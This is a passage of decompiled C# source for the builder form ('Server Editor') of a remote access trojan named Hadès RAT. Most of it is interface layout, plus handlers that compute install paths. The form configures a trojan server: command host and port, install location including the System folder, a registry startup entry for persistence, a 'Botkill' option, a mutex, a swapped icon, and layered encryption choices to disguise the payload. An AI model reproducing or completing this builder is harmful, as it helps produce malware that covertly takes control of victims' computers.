            this.CheckBox4.TabIndex = 0x17;
            this.CheckBox4.Text = "Botkill";
            this.CheckBox4.UseVisualStyleBackColor = true;
            this.Label10.AutoSize = true;
            point = new Point(6, 20);
            this.Label10.Location = point;
            this.Label10.Name = "Label10";
            size = new Size(0x2e, 13);
            this.Label10.Size = size;
            this.Label10.TabIndex = 20;
            this.Label10.Text = "Version:";
            point = new Point(0x39, 0x11);
            this.TextBox7.Location = point;
            this.TextBox7.Name = "TextBox7";
            size = new Size(140, 0x15);
            this.TextBox7.Size = size;
            this.TextBox7.TabIndex = 0x13;
            this.CheckBox5.AutoSize = true;
            point = new Point(0x1f, 0x2c);
            this.CheckBox5.Location = point;
            this.CheckBox5.Name = "CheckBox5";
            size = new Size(120, 0x11);
            this.CheckBox5.Size = size;
            this.CheckBox5.TabIndex = 0x16;
            this.CheckBox5.Text = "Startup Persistence";
            this.CheckBox5.UseVisualStyleBackColor = true;
            this.Label20.AutoSize = true;
            this.Label20.Font = new Font("Microsoft Sans Serif", 18f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.Label20.ForeColor = SystemColors.ControlDarkDark;
            point = new Point(6, 5);
            this.Label20.Location = point;
            this.Label20.Name = "Label20";
            size = new Size(0xa8, 0x1d);
            this.Label20.Size = size;
            this.Label20.TabIndex = 0x2a;
            this.Label20.Text = "Miscellaneous";
            this.TabPage5.BackColor = Color.White;
            this.TabPage5.Controls.Add(this.GroupBox7);
            this.TabPage5.Controls.Add(this.GroupBox6);
            this.TabPage5.Controls.Add(this.Label19);
            point = new Point(140, 4);
            this.TabPage5.Location = point;
            this.TabPage5.Name = "TabPage5";
            size = new Size(0x1bc, 0x156);
            this.TabPage5.Size = size;
            this.TabPage5.TabIndex = 2;
            this.TabPage5.Text = "Icon";
            this.GroupBox7.Controls.Add(this.PictureBox1);
            point = new Point(6, 0x86);
            this.GroupBox7.Location = point;
            this.GroupBox7.Name = "GroupBox7";
            size = new Size(430, 0x60);
            this.GroupBox7.Size = size;
            this.GroupBox7.TabIndex = 0x2b;
            this.GroupBox7.TabStop = false;
            this.GroupBox7.Text = "Preview";
            this.PictureBox1.BackColor = Color.FromArgb(0xe0, 0xe0, 0xe0);
            point = new Point(6, 0x13);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            size = new Size(0x40, 0x40);
            this.PictureBox1.Size = size;
            this.PictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;
            this.PictureBox1.TabIndex = 0x17;
            this.PictureBox1.TabStop = false;
            this.GroupBox6.Controls.Add(this.TextBox6);
            this.GroupBox6.Controls.Add(this.Button3);
            this.GroupBox6.Controls.Add(this.CheckBox2);
            point = new Point(6, 0x25);
            this.GroupBox6.Location = point;
            this.GroupBox6.Name = "GroupBox6";
            size = new Size(430, 0x5b);
            this.GroupBox6.Size = size;
            this.GroupBox6.TabIndex = 0x2a;
            this.GroupBox6.TabStop = false;
            this.GroupBox6.Text = "Change Icon";
            point = new Point(6, 0x13);
            this.TextBox6.Location = point;
            this.TextBox6.Name = "TextBox6";
            size = new Size(0x108, 0x15);
            this.TextBox6.Size = size;
            this.TextBox6.TabIndex = 0x16;
            point = new Point(0x9e, 0x2f);
            this.Button3.Location = point;
            this.Button3.Name = "Button3";
            size = new Size(0x70, 0x17);
            this.Button3.Size = size;
            this.Button3.TabIndex = 0x18;
            this.Button3.Text = "Browse Icon...";
            this.Button3.UseVisualStyleBackColor = true;
            this.CheckBox2.AutoSize = true;
            point = new Point(12, 0x31);
            this.CheckBox2.Location = point;
            this.CheckBox2.Name = "CheckBox2";
            size = new Size(0x57, 0x11);
            this.CheckBox2.Size = size;
            this.CheckBox2.TabIndex = 0x19;
            this.CheckBox2.Text = "Change Icon";
            this.CheckBox2.UseVisualStyleBackColor = true;
            this.Label19.AutoSize = true;
            this.Label19.Font = new Font("Microsoft Sans Serif", 18f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.Label19.ForeColor = SystemColors.ControlDarkDark;
            point = new Point(6, 5);
            this.Label19.Location = point;
            this.Label19.Name = "Label19";
            size = new Size(0x3a, 0x1d);
            this.Label19.Size = size;
            this.Label19.TabIndex = 0x29;
            this.Label19.Text = "Icon";
            this.TabPage4.BackColor = Color.White;
            this.TabPage4.Controls.Add(this.GroupBox9);
            this.TabPage4.Controls.Add(this.Label14);
            this.TabPage4.Controls.Add(this.GroupBox3);
            this.TabPage4.Controls.Add(this.GroupBox2);
            this.TabPage4.Controls.Add(this.GroupBox1);
            point = new Point(140, 4);
            this.TabPage4.Location = point;
            this.TabPage4.Name = "TabPage4";
            padding = new Padding(3);
            this.TabPage4.Padding = padding;
            size = new Size(0x1bc, 0x156);
            this.TabPage4.Size = size;
            this.TabPage4.TabIndex = 1;
            this.TabPage4.Text = "Install";
            this.GroupBox9.Controls.Add(this.Button4);
            this.GroupBox9.Controls.Add(this.TextBox_0);
            point = new Point(8, 0x126);
            this.GroupBox9.Location = point;
            this.GroupBox9.Name = "GroupBox9";
            size = new Size(430, 0x2a);
            this.GroupBox9.Size = size;
            this.GroupBox9.TabIndex = 40;
            this.GroupBox9.TabStop = false;
            this.GroupBox9.Text = "Mutex";
            point = new Point(0x98, 0x10);
            this.Button4.Location = point;
            this.Button4.Name = "Button4";
            size = new Size(0x3e, 20);
            this.Button4.Size = size;
            this.Button4.TabIndex = 0x2a;
            this.Button4.Text = "Generate";
            this.Button4.UseVisualStyleBackColor = true;
            this.TextBox_0.BackColor = Color.White;
            point = new Point(6, 0x10);
            this.TextBox_0.Location = point;
            this.TextBox_0.Name = "TextBox10";
            this.TextBox_0.ReadOnly = true;
            size = new Size(140, 0x15);
            this.TextBox_0.Size = size;
            this.TextBox_0.TabIndex = 0x29;
            this.Label14.AutoSize = true;
            this.Label14.Font = new Font("Microsoft Sans Serif", 18f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.Label14.ForeColor = SystemColors.ControlDarkDark;
            point = new Point(6, 5);
            this.Label14.Location = point;
            this.Label14.Name = "Label14";
            size = new Size(0x4b, 0x1d);
            this.Label14.Size = size;
            this.Label14.TabIndex = 0x27;
            this.Label14.Text = "Install";
            this.GroupBox3.Controls.Add(this.Label12);
            this.GroupBox3.Controls.Add(this.Label6);
            this.GroupBox3.Controls.Add(this.Label13);
            this.GroupBox3.Controls.Add(this.TextBox3);
            this.GroupBox3.Controls.Add(this.TextBox8);
            point = new Point(6, 0x25);
            this.GroupBox3.Location = point;
            this.GroupBox3.Name = "GroupBox3";
            size = new Size(430, 0x48);
            this.GroupBox3.Size = size;
            this.GroupBox3.TabIndex = 0x26;
            this.GroupBox3.TabStop = false;
            this.GroupBox3.Text = "Install Names";
            this.Label12.AutoSize = true;
            point = new Point(6, 0x10);
            this.Label12.Location = point;
            this.Label12.Name = "Label12";
            size = new Size(0x4a, 13);
            this.Label12.Size = size;
            this.Label12.TabIndex = 20;
            this.Label12.Text = "Server-Name:";
            this.Label6.AutoSize = true;
            point = new Point(6, 0x2a);
            this.Label6.Location = point;
            this.Label6.Name = "Label6";
            size = new Size(0xc7, 13);
            this.Label6.Size = size;
            this.Label6.TabIndex = 0x17;
            this.Label6.Text = "Startup-Name (HKEY_CURRENT_USER):";
            this.Label13.AutoSize = true;
            point = new Point(0xe3, 0x10);
            this.Label13.Location = point;
            this.Label13.Name = "Label13";
            size = new Size(0x1d, 13);
            this.Label13.Size = size;
            this.Label13.TabIndex = 0x15;
            this.Label13.Text = ".exe";
            point = new Point(220, 0x27);
            this.TextBox3.Location = point;
            this.TextBox3.Name = "TextBox3";
            size = new Size(140, 0x15);
            this.TextBox3.Size = size;
            this.TextBox3.TabIndex = 0x16;
            point = new Point(0x51, 13);
            this.TextBox8.Location = point;
            this.TextBox8.Name = "TextBox8";
            size = new Size(140, 0x15);
            this.TextBox8.Size = size;
            this.TextBox8.TabIndex = 0x13;
            this.TextBox8.Text = "server";
            this.GroupBox2.Controls.Add(this.RadioButton6);
            this.GroupBox2.Controls.Add(this.PictureBox6);
            this.GroupBox2.Controls.Add(this.RadioButton5);
            this.GroupBox2.Controls.Add(this.RadioButton4);
            this.GroupBox2.Controls.Add(this.Label11);
            this.GroupBox2.Controls.Add(this.Label7);
            this.GroupBox2.Controls.Add(this.PictureBox3);
            this.GroupBox2.Controls.Add(this.Label5);
            this.GroupBox2.Controls.Add(this.PictureBox2);
            this.GroupBox2.Controls.Add(this.TextBox9);
            this.GroupBox2.Controls.Add(this.RadioButton3);
            this.GroupBox2.Controls.Add(this.RadioButton1);
            this.GroupBox2.Controls.Add(this.RadioButton2);
            point = new Point(8, 0x73);
            this.GroupBox2.Location = point;
            this.GroupBox2.Name = "GroupBox2";
            size = new Size(430, 120);
            this.GroupBox2.Size = size;
            this.GroupBox2.TabIndex = 0x25;
            this.GroupBox2.TabStop = false;
            this.GroupBox2.Text = "Install Directory";
            this.RadioButton6.AutoSize = true;
            point = new Point(0x3e, 0x40);
            this.RadioButton6.Location = point;
            this.RadioButton6.Name = "RadioButton6";
            size = new Size(0x52, 0x11);
            this.RadioButton6.Size = size;
            this.RadioButton6.TabIndex = 40;
            this.RadioButton6.TabStop = true;
            this.RadioButton6.Text = "Don't Install";
            this.RadioButton6.UseVisualStyleBackColor = true;
            this.PictureBox6.Image = Class5.smethod_88();
            point = new Point(0xc0, 0x11);
            this.PictureBox6.Location = point;
            this.PictureBox6.Name = "PictureBox6";
            size = new Size(0x10, 20);
            this.PictureBox6.Size = size;
            this.PictureBox6.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PictureBox6.TabIndex = 0x27;
            this.PictureBox6.TabStop = false;
            this.RadioButton5.AutoSize = true;
            point = new Point(0xd6, 20);
            this.RadioButton5.Location = point;
            this.RadioButton5.Name = "RadioButton5";
            size = new Size(70, 0x11);
            this.RadioButton5.Size = size;
            this.RadioButton5.TabIndex = 0x26;
            this.RadioButton5.TabStop = true;
            this.RadioButton5.Text = "Favorites";
            this.RadioButton5.UseVisualStyleBackColor = true;
            this.RadioButton4.AutoSize = true;
            point = new Point(0x3e, 0x2a);
            this.RadioButton4.Location = point;
            this.RadioButton4.Name = "RadioButton4";
            size = new Size(0x6c, 0x11);
            this.RadioButton4.Size = size;
            this.RadioButton4.TabIndex = 0x25;
            this.RadioButton4.TabStop = true;
            this.RadioButton4.Text = "Temporary folder";
            this.RadioButton4.UseVisualStyleBackColor = true;
            this.Label11.AutoSize = true;
            this.Label11.Font = new Font("Microsoft Sans Serif", 6.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            point = new Point(0x110, 0x60);
            this.Label11.Location = point;
            this.Label11.Name = "Label11";
            size = new Size(0x8a, 12);
            this.Label11.Size = size;
            this.Label11.TabIndex = 0x24;
            this.Label11.Text = "leave blank for no extra directory";
            this.Label7.AutoSize = true;
            point = new Point(6, 0x15);
            this.Label7.Location = point;
            this.Label7.Name = "Label7";
            size = new Size(0x37, 13);
            this.Label7.Size = size;
            this.Label7.TabIndex = 0x1b;
            this.Label7.Text = "Directory:";
            this.PictureBox3.Image = Class5.smethod_88();
            point = new Point(0xc0, 0x40);
            this.PictureBox3.Location = point;
            this.PictureBox3.Name = "PictureBox3";
            size = new Size(0x10, 20);
            this.PictureBox3.Size = size;
            this.PictureBox3.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PictureBox3.TabIndex = 0x23;
            this.PictureBox3.TabStop = false;
            this.Label5.AutoSize = true;
            point = new Point(6, 0x5f);
            this.Label5.Location = point;
            this.Label5.Name = "Label5";
            size = new Size(0x72, 13);
            this.Label5.Size = size;
            this.Label5.TabIndex = 0x18;
            this.Label5.Text = "Extra Directory Name:";
            this.PictureBox2.Image = Class5.smethod_88();
            point = new Point(0xc0, 40);
            this.PictureBox2.Location = point;
            this.PictureBox2.Name = "PictureBox2";
            size = new Size(0x10, 20);
            this.PictureBox2.Size = size;
            this.PictureBox2.SizeMode = PictureBoxSizeMode.AutoSize;
            this.PictureBox2.TabIndex = 0x22;
            this.PictureBox2.TabStop = false;
            point = new Point(0x7a, 0x5c);
            this.TextBox9.Location = point;
            this.TextBox9.Name = "TextBox9";
            size = new Size(0x90, 0x15);
            this.TextBox9.Size = size;
            this.TextBox9.TabIndex = 0x19;
            this.RadioButton3.AutoSize = true;
            point = new Point(0xd6, 0x41);
            this.RadioButton3.Location = point;
            this.RadioButton3.Name = "RadioButton3";
            size = new Size(0x59, 0x11);
            this.RadioButton3.Size = size;
            this.RadioButton3.TabIndex = 0x1d;
            this.RadioButton3.Text = "Program Files";
            this.RadioButton3.UseVisualStyleBackColor = true;
            this.RadioButton1.AutoSize = true;
            this.RadioButton1.Checked = true;
            point = new Point(0x3e, 20);
            this.RadioButton1.Location = point;
            this.RadioButton1.Name = "RadioButton1";
            size = new Size(0x67, 0x11);
            this.RadioButton1.Size = size;
            this.RadioButton1.TabIndex = 0x1a;
            this.RadioButton1.TabStop = true;
            this.RadioButton1.Text = "Application Data";
            this.RadioButton1.UseVisualStyleBackColor = true;
            this.RadioButton2.AutoSize = true;
            point = new Point(0xd6, 0x2a);
            this.RadioButton2.Location = point;
            this.RadioButton2.Name = "RadioButton2";
            size = new Size(60, 0x11);
            this.RadioButton2.Size = size;
            this.RadioButton2.TabIndex = 0x1c;
            this.RadioButton2.Text = "System";
            this.RadioButton2.UseVisualStyleBackColor = true;
            this.GroupBox1.Controls.Add(this.Label15);
            point = new Point(8, 0xf1);
            this.GroupBox1.Location = point;
            this.GroupBox1.Name = "GroupBox1";
            size = new Size(430, 0x2f);
            this.GroupBox1.Size = size;
            this.GroupBox1.TabIndex = 0x24;
            this.GroupBox1.TabStop = false;
            this.GroupBox1.Text = "Example Path on your PC:";
            this.Label15.AutoSize = true;
            point = new Point(6, 0x15);
            this.Label15.Location = point;
            this.Label15.Name = "Label15";
            size = new Size(0x37, 13);
            this.Label15.Size = size;
            this.Label15.TabIndex = 0x1f;
            this.Label15.Text = "%PATH%";
            this.TabPage3.BackColor = Color.White;
            this.TabPage3.Controls.Add(this.GroupBox5);
            this.TabPage3.Controls.Add(this.GroupBox4);
            this.TabPage3.Controls.Add(this.Label16);
            point = new Point(140, 4);
            this.TabPage3.Location = point;
            this.TabPage3.Name = "TabPage3";
            padding = new Padding(3);
            this.TabPage3.Padding = padding;
            size = new Size(0x1bc, 0x156);
            this.TabPage3.Size = size;
            this.TabPage3.TabIndex = 0;
            this.TabPage3.Text = "Connection";
            this.GroupBox5.Controls.Add(this.Label9);
            this.GroupBox5.Controls.Add(this.PictureBox5);
            this.GroupBox5.Controls.Add(this.Label18);
            this.GroupBox5.Controls.Add(this.Button2);
            point = new Point(6, 0xd9);
            this.GroupBox5.Location = point;
            this.GroupBox5.Name = "GroupBox5";
            size = new Size(430, 0x34);
            this.GroupBox5.Size = size;
            this.GroupBox5.TabIndex = 0x2a;
            this.GroupBox5.TabStop = false;
            this.GroupBox5.Text = "Test Connection";
            this.Label9.AutoSize = true;
            point = new Point(260, 0x18);
            this.Label9.Location = point;
            this.Label9.Name = "Label9";
            size = new Size(0xa3, 13);
            this.Label9.Size = size;
            this.Label9.TabIndex = 3;
            this.Label9.Text = "Please enter a Host/IP and Port!";
            this.Label9.Visible = false;
            point = new Point(0xee, 0x16);
            this.PictureBox5.Location = point;
            this.PictureBox5.Name = "PictureBox5";
            size = new Size(0x10, 0x10);
            this.PictureBox5.Size = size;
            this.PictureBox5.TabIndex = 2;
            this.PictureBox5.TabStop = false;
            this.Label18.AutoSize = true;
            this.Label18.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            point = new Point(0xb8, 0x16);
            this.Label18.Location = point;
            this.Label18.Name = "Label18";
            size = new Size(0x30, 0x10);
            this.Label18.Size = size;
            this.Label18.TabIndex = 1;
            this.Label18.Text = "Status:";
            this.Button2.Image = (Image) manager.GetObject("Button2.Image");
            this.Button2.ImageAlign = ContentAlignment.MiddleLeft;
            point = new Point(6, 0x13);
            this.Button2.Location = point;
            this.Button2.Name = "Button2";
            size = new Size(0x92, 0x17);
            this.Button2.Size = size;
            this.Button2.TabIndex = 0;
            this.Button2.Text = "Test Connection now";
            this.Button2.UseVisualStyleBackColor = true;
            this.GroupBox4.Controls.Add(this.PictureBox4);
            this.GroupBox4.Controls.Add(this.Label1);
            this.GroupBox4.Controls.Add(this.Label4);
            this.GroupBox4.Controls.Add(this.CheckBox1);
            this.GroupBox4.Controls.Add(this.Label2);
            this.GroupBox4.Controls.Add(this.Label8);
            this.GroupBox4.Controls.Add(this.Label3);
            this.GroupBox4.Controls.Add(this.TextBox5);
            this.GroupBox4.Controls.Add(this.TextBox1);
            this.GroupBox4.Controls.Add(this.TextBox2);
            point = new Point(6, 0x25);
            this.GroupBox4.Location = point;
            this.GroupBox4.Name = "GroupBox4";
            size = new Size(430, 0xae);
            this.GroupBox4.Size = size;
            this.GroupBox4.TabIndex = 0x29;
            this.GroupBox4.TabStop = false;
            this.GroupBox4.Text = "Connection Settings";
            this.PictureBox4.Image = (Image) manager.GetObject("PictureBox4.Image");
            point = new Point(0x114, 0x79);
            this.PictureBox4.Location = point;
            this.PictureBox4.Name = "PictureBox4";
            size = new Size(0x10, 0x11);
            this.PictureBox4.Size = size;
            this.PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
            this.PictureBox4.TabIndex = 0x24;
            this.PictureBox4.TabStop = false;
            this.Label1.AutoSize = true;
            point = new Point(6, 20);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            size = new Size(0x2f, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 0x1f;
            this.Label1.Text = "Host/IP:";
            this.Label4.AutoSize = true;
            point = new Point(0x41, 0x58);
            this.Label4.Location = point;
            this.Label4.Name = "Label4";
            size = new Size(0x4e, 13);
            this.Label4.Size = size;
            this.Label4.TabIndex = 0x1c;
            this.Label4.Text = "Example: 1773";
            this.CheckBox1.AutoSize = true;
            point = new Point(0x44, 0x92);
            this.CheckBox1.Location = point;
            this.CheckBox1.Name = "CheckBox1";
            size = new Size(0x65, 0x11);
            this.CheckBox1.Size = size;
            this.CheckBox1.TabIndex = 0x22;
            this.CheckBox1.Text = "Show Password";
            this.CheckBox1.UseVisualStyleBackColor = true;
            this.Label2.AutoSize = true;
            point = new Point(6, 0x44);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x1f, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 0x20;
            this.Label2.Text = "Port:";
            this.Label3.AutoSize = true;
            point = new Point(0x41, 40);
            this.Label3.Location = point;
            this.Label3.Name = "Label3";
            size = new Size(0xb5, 13);
            this.Label3.Size = size;
            this.Label3.TabIndex = 0x21;
            this.Label3.Text = "Example: example.com or 127.0.0.1";
            point = new Point(0x44, 0x11);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            size = new Size(0xb3, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 0x1b;
            point = new Point(0x44, 0x41);
            this.TextBox2.Location = point;
            this.TextBox2.Name = "TextBox2";
            size = new Size(0xac, 0x15);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 0x1d;
            this.Label16.AutoSize = true;
            this.Label16.Font = new Font("Microsoft Sans Serif", 18f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.Label16.ForeColor = SystemColors.ControlDarkDark;
            point = new Point(6, 5);
            this.Label16.Location = point;
            this.Label16.Name = "Label16";
            size = new Size(0x87, 0x1d);
            this.Label16.Size = size;
            this.Label16.TabIndex = 40;
            this.Label16.Text = "Connection";
            this.SideTab1.Alignment = TabAlignment.Left;
            this.SideTab1.Controls.Add(this.TabPage3);
            this.SideTab1.Controls.Add(this.TabPage4);
            this.SideTab1.Controls.Add(this.TabPage5);
            this.SideTab1.Controls.Add(this.TabPage7);
            this.SideTab1.Controls.Add(this.TabPage6);
            this.SideTab1.method_1(50);
            size = new Size(0x2c, 0x88);
            this.SideTab1.ItemSize = size;
            point = new Point(0, 0);
            this.SideTab1.Location = point;
            this.SideTab1.Multiline = true;
            this.SideTab1.Name = "SideTab1";
            this.SideTab1.SelectedIndex = 0;
            size = new Size(0x24c, 350);
            this.SideTab1.Size = size;
            this.SideTab1.SizeMode = TabSizeMode.Fixed;
            this.SideTab1.TabIndex = 0;
            this.TabPage7.BackColor = Color.White;
            this.TabPage7.Controls.Add(this.TextBox_1);
            this.TabPage7.Controls.Add(this.Label17);
            this.TabPage7.Controls.Add(this.CheckBox_0);
            this.TabPage7.Controls.Add(this.CheckBox_1);
            this.TabPage7.Controls.Add(this.CheckBox_2);
            this.TabPage7.Controls.Add(this.CheckBox_3);
            this.TabPage7.Controls.Add(this.CheckBox7);
            this.TabPage7.Controls.Add(this.CheckBox8);
            this.TabPage7.Controls.Add(this.CheckBox9);
            this.TabPage7.Controls.Add(this.CheckBox_4);
            point = new Point(140, 4);
            this.TabPage7.Location = point;
            this.TabPage7.Name = "TabPage7";
            size = new Size(0x1bc, 0x156);
            this.TabPage7.Size = size;
            this.TabPage7.TabIndex = 4;
            this.TabPage7.Text = "Multi-Encryption";
            point = new Point(0x18, 130);
            this.TextBox_1.Location = point;
            this.TextBox_1.Multiline = true;
            this.TextBox_1.Name = "TextBox11";
            size = new Size(0x12a, 0x3b);
            this.TextBox_1.Size = size;
            this.TextBox_1.TabIndex = 14;
            this.TextBox_1.Text = "xJiqkxcpAeklx5987quTixoNzpQlwKnApEuTxNQooeuTR1pmwqa785dsoxnwPOSnwQiTyQiApoEQwXnebVQiwoQ4Qa12Q3w9bNwoa458Qjwq";
            this.Label17.AutoSize = true;
            point = new Point(0x34, 15);
            this.Label17.Location = point;
            this.Label17.Name = "Label17";
            size = new Size(0xed, 13);
            this.Label17.Size = size;
            this.Label17.TabIndex = 13;
            this.Label17.Text = "(Had\x00e8s RAT can support all encryption checked)";
            this.CheckBox_0.AutoSize = true;
            point = new Point(0x22, 90);
            this.CheckBox_0.Location = point;
            this.CheckBox_0.Name = "CheckBox11";
            size = new Size(0x49, 0x11);
            this.CheckBox_0.Size = size;
            this.CheckBox_0.TabIndex = 10;
            this.CheckBox_0.Text = "PolyStairs";
            this.CheckBox_0.UseVisualStyleBackColor = true;
            this.CheckBox_1.AutoSize = true;
            point = new Point(0x71, 90);
            this.CheckBox_1.Location = point;
            this.CheckBox_1.Name = "CheckBox12";
            size = new Size(0x2e, 0x11);
            this.CheckBox_1.Size = size;
            this.CheckBox_1.TabIndex = 11;
            this.CheckBox_1.Text = "RC4";
            this.CheckBox_1.UseVisualStyleBackColor = true;
            this.CheckBox_2.AutoSize = true;
            point = new Point(0xad, 90);
            this.CheckBox_2.Location = point;
            this.CheckBox_2.Name = "CheckBox13";
            size = new Size(0x43, 0x11);
            this.CheckBox_2.Size = size;
            this.CheckBox_2.TabIndex = 12;
            this.CheckBox_2.Text = "BASE-64";
            this.CheckBox_2.UseVisualStyleBackColor = true;
            this.CheckBox_3.AutoSize = true;
            point = new Point(0xfc, 90);
            this.CheckBox_3.Location = point;
            this.CheckBox_3.Name = "CheckBox14";
            size = new Size(0x40, 0x11);
            this.CheckBox_3.Size = size;
            this.CheckBox_3.TabIndex = 9;
            this.CheckBox_3.Text = "Rijndael";
            this.CheckBox_3.UseVisualStyleBackColor = true;
            this.CheckBox7.AutoSize = true;
            this.CheckBox7.Checked = true;
            this.CheckBox7.CheckState = CheckState.Checked;
            point = new Point(0x22, 0x2f);
            this.CheckBox7.Location = point;
            this.CheckBox7.Name = "CheckBox7";
            size = new Size(0x2d, 0x11);
            this.CheckBox7.Size = size;
            this.CheckBox7.TabIndex = 6;
            this.CheckBox7.Text = "AES";
            this.CheckBox7.UseVisualStyleBackColor = true;
            this.CheckBox8.AutoSize = true;
            point = new Point(0x71, 0x2f);
            this.CheckBox8.Location = point;
            this.CheckBox8.Name = "CheckBox8";
            size = new Size(0x2e, 0x11);
            this.CheckBox8.Size = size;
            this.CheckBox8.TabIndex = 7;
            this.CheckBox8.Text = "RC4";
            this.CheckBox8.UseVisualStyleBackColor = true;
            this.CheckBox9.AutoSize = true;
            point = new Point(0xad, 0x2f);
            this.CheckBox9.Location = point;
            this.CheckBox9.Name = "CheckBox9";
            size = new Size(0x2f, 0x11);
            this.CheckBox9.Size = size;
            this.CheckBox9.TabIndex = 8;
            this.CheckBox9.Text = "XOR";
            this.CheckBox9.UseVisualStyleBackColor = true;
            this.CheckBox_4.AutoSize = true;
            point = new Point(0xfc, 0x2f);
            this.CheckBox_4.Location = point;
            this.CheckBox_4.Name = "CheckBox10";
            size = new Size(0x2e, 0x11);
            this.CheckBox_4.Size = size;
            this.CheckBox_4.TabIndex = 0;
            this.CheckBox_4.Text = "RC2";
            this.CheckBox_4.UseVisualStyleBackColor = true;
            point = new Point(11, 0x16b);
            this.Win8Progressbar1.Location = point;
            this.Win8Progressbar1.Maximum = 10;
            this.Win8Progressbar1.Name = "Win8Progressbar1";
            size = new Size(0x1ab, 0x17);
            this.Win8Progressbar1.Size = size;
            this.Win8Progressbar1.TabIndex = 5;
            this.Button1.Image = (Image) manager.GetObject("Button1.Image");
            this.Button1.ImageAlign = ContentAlignment.TopLeft;
            point = new Point(0x1bc, 0x163);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(0x84, 0x27);
            this.Button1.Size = size;
            this.Button1.TabIndex = 1;
            this.Button1.Text = "Build Server now";
            this.Button1.UseVisualStyleBackColor = true;
            this.AcceptButton = this.Button1;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.White;
            size = new Size(0x24c, 400);
            this.ClientSize = size;
            this.Controls.Add(this.Win8Progressbar1);
            this.Controls.Add(this.CheckBox3);
            this.Controls.Add(this.TextBox4);
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.SideTab1);
            this.DoubleBuffered = true;
            this.FormBorderStyle = FormBorderStyle.Fixed3D;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Builder";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Server Editor";
            this.TabPage6.ResumeLayout(false);
            this.TabPage6.PerformLayout();
            this.GroupBox_0.ResumeLayout(false);
            this.GroupBox_0.PerformLayout();
            this.GroupBox8.ResumeLayout(false);
            this.GroupBox8.PerformLayout();
            ((ISupportInitialize) this.PictureBox7).EndInit();
            this.TabPage5.ResumeLayout(false);
            this.TabPage5.PerformLayout();
            this.GroupBox7.ResumeLayout(false);
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.GroupBox6.ResumeLayout(false);
            this.GroupBox6.PerformLayout();
            this.TabPage4.ResumeLayout(false);
            this.TabPage4.PerformLayout();
            this.GroupBox9.ResumeLayout(false);
            this.GroupBox9.PerformLayout();
            this.GroupBox3.ResumeLayout(false);
            this.GroupBox3.PerformLayout();
            this.GroupBox2.ResumeLayout(false);
            this.GroupBox2.PerformLayout();
            ((ISupportInitialize) this.PictureBox6).EndInit();
            ((ISupportInitialize) this.PictureBox3).EndInit();
            ((ISupportInitialize) this.PictureBox2).EndInit();
            this.GroupBox1.ResumeLayout(false);
            this.GroupBox1.PerformLayout();
            this.TabPage3.ResumeLayout(false);
            this.TabPage3.PerformLayout();
            this.GroupBox5.ResumeLayout(false);
            this.GroupBox5.PerformLayout();
            ((ISupportInitialize) this.PictureBox5).EndInit();
            this.GroupBox4.ResumeLayout(false);
            this.GroupBox4.PerformLayout();
            ((ISupportInitialize) this.PictureBox4).EndInit();
            this.SideTab1.ResumeLayout(false);
            this.TabPage7.ResumeLayout(false);
            this.TabPage7.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void method_0()
        {
            if (!this.CheckBox3.Checked)
            {
                for (int i = this.Size.Height; i <= 0x20c; i++)
                {
                    Thread.Sleep(1);
                    Application.DoEvents();
                    Point point = new Point(0x256, i);
                    this.Size = (Size) point;
                }
                this.CheckBox3.Checked = true;
            }
        }

        private object method_1(int int_0, string string_0)
        {
            string str = string.Empty;
            Random random = new Random();
            int num = int_0 - 1;
            for (int i = 0; i <= num; i++)
            {
                VBMath.Randomize();
                str = str + Conversions.ToString(string_0[random.Next(0, string_0.Length - 1)]);
            }
            return str;
        }

        private void RadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton2.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton3.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
        }

        private void RadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                if (this.TextBox9.Text != null)
                {
